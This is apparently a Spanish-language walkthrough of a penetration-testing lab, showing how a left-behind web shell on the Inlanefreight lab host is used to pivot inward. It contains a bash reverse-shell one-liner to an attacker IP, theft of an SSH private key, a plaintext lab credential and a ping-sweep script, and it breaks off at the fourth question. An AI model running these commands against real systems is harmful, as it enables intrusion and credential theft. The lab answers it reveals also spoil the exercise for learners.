## Scenario

A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:

---

## Objectives

- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
- Grab `any/all` flags that can be found.


---
Target: 10.129.229.129
**1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.**
Nos ponemos en escucha por el puerto 1234 con: 
```
nc -lvnp 1234
```
Desde la webshell ubicada en: http://10.129.229.129, ejecuto:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.216/1234 0>&1' &
```

Para enviarme una revershell a mi máquina atacante.

Al recibirla, la acondiciono con:
 ```
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
 ```

Veo:
```
www-data@inlanefreight:/home$ tree
.
|-- administrator
`-- webadmin
    |-- for-admin-eyes-only
    `-- id_rsa
```

Me copio el contenido de "id_rsa" en mi máquina atacante.
```
chmod 600 id_rsa
```

Siendo la respuesta del ejercicio: webadmin

**2. Submit the credentials found in the user's home directory. (Format: user:password)**
Entro en la sesión ssh con: 
```
ssh webadmin@10.129.229.129 -i id_rsa
```

Y puedo acceder al contenido de "for-admin-eyes-only":
```
webadmin@inlanefreight:~$ cat for-admin-eyes-only 
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of : 
Plain Human work!
```

Siendo la respuesta: "mlefay:Plain Human work!"


** 3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.**

Creamos un pequeño script en la máquina SSH con: 

```
vim escaneador.sh
```

Con el siguiente contenido:
```
#!/bin/bash

# Define la base de la red y el tiempo de espera (timeout) en segundos
RED_BASE="172.16.5"
TIMEOUT="1"

echo "Iniciando escaneo en la red ${RED_BASE}.0/24..."

for i in {1..254}; do
    # -c 1: Envía solo un paquete
    # -W $TIMEOUT: Espera solo 1 segundo por respuesta
    # 2>/dev/null: Descarta errores (hosts que no responden)
    # grep 'ttl=': Busca la cadena exacta de respuesta exitosa
    
    ping -c 1 -W $TIMEOUT "${RED_BASE}.$i" 2>/dev/null | grep 'ttl=' &
done

# Espera a que terminen todos los pings en segundo plano
wait

echo "Escaneo completado."
```

Le damos permisos de ejecución con:

```
chmod +x escaneador.sh
```

Y nos encuentra: 
```
Iniciando escaneo en la red 172.16.5.0/24...
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.041 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.491 ms
Escaneo completado.
```

Respuesta: 172.16.5.35

**4. Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.**

